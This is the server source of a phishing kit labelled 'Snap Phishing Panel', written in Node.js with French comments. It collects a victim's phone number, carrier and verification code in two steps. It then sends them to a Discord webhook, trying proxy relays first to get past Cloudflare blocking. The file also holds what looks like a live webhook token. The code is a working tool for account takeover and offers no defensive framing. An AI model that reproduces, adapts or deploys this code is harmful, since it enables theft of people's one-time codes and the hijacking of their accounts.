const express = require('express');
const path = require('path');
const app = express();

// ✅ Ton nouveau webhook Discord
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1523297468840935444/0Hq1u4X7B2UGZha98XM1f0WdBZEoJiA3uSQKPw2-YXGcPbMJ29IsYYkEDPybknuNJrjD';

// 🌐 Proxies pour contourner le blocage Cloudflare
const PROXY_HYRA = 'https://api.hooks.hyra.io/api/webhooks/1523297468840935444/0Hq1u4X7B2UGZha98XM1f0WdBZEoJiA3uSQKPw2-YXGcPbMJ29IsYYkEDPybknuNJrjD';
const PROXY_LEWIS = 'https://webhook.lewisakura.moe/api/webhooks/1523297468840935444/0Hq1u4X7B2UGZha98XM1f0WdBZEoJiA3uSQKPw2-YXGcPbMJ29IsYYkEDPybknuNJrjD';

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// 📱 Étape 1
app.post('/api/submit', async (req, res) => {
    const { phone, operator } = req.body;
    if (!phone || !operator) return res.status(400).json({ error: 'Champs manquants' });

    console.log(`[+] Numéro: ${phone} | Opérateur: ${operator}`);

    await sendToDiscord({
        embeds: [{
            color: 0xFFFC00,
            title: '📞 Étape 1 - Nouveau numéro',
            thumbnail: { url: 'https://assets.stickpng.com/images/580b57fcd9996e24bc43c536.png' },
            fields: [
                { name: '📱 Numéro', value: `**${phone}**`, inline: true },
                { name: '📡 Opérateur', value: `**${operator}**`, inline: true },
                { name: '🕐 Heure', value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), inline: false }
            ],
            footer: { text: 'Snap Phishing • Étape 1/2' },
            timestamp: new Date().toISOString()
        }]
    });

    res.json({ success: true });
});

// 🔑 Étape 2
app.post('/api/verify', async (req, res) => {
    const { phone, operator, code } = req.body;
    if (!phone || !code) return res.status(400).json({ error: 'Champs manquants' });

    console.log(`[+] Code: ${code} pour ${phone}`);

    await sendToDiscord({
        embeds: [{
            color: 0x00FF00,
            title: '🔓 Étape 2 - Code reçu !',
            thumbnail: { url: 'https://assets.stickpng.com/images/580b57fcd9996e24bc43c536.png' },
            fields: [
                { name: '📱 Numéro', value: `**${phone}**`, inline: true },
                { name: '📡 Opérateur', value: `**${operator || 'Non spécifié'}**`, inline: true },
                { name: '🔑 Code', value: `**\`${code}\`**`, inline: true },
                { name: '🕐 Heure', value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), inline: false }
            ],
            footer: { text: 'Snap Phishing • Étape 2/2 ✅' },
            timestamp: new Date().toISOString()
        }]
    });

    res.json({ success: true });
});

// 📤 Envoie vers Discord (essaie plusieurs méthodes)
async function sendToDiscord(payload) {
    const body = JSON.stringify({
        username: '📸 Snap Phishing',
        avatar_url: 'https://assets.stickpng.com/images/580b57fcd9996e24bc43c536.png',
        ...payload
    });

    const headers = { 'Content-Type': 'application/json' };

    // 1️⃣ Proxy Hyra
    try {
        const r = await fetch(PROXY_HYRA, { method: 'POST', headers, body });
        if (r.ok) { console.log('✅ Discord (via hyra)'); return; }
    } catch(e) {}

    // 2️⃣ Proxy Lewis
    try {
        const r = await fetch(PROXY_LEWIS, { method: 'POST', headers, body });
        if (r.ok) { console.log('✅ Discord (via lewis)'); return; }
    } catch(e) {}

    // 3️⃣ Discord direct
    try {
        const r = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers, body });
        if (r.ok) { console.log('✅ Discord (direct)'); return; }
        console.log(`❌ Discord direct: ${r.status}`);
    } catch(e) {
        console.log('❌ Discord direct: erreur réseau');
    }

    console.log('⚠️ Données dans les logs uniquement');
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════╗
║  📸 Snap Phishing Panel      ║
║  🚀 http://localhost:${PORT}  ║
║  🌐 Proxy webhook actif      ║
╚══════════════════════════════╝
    `);
});
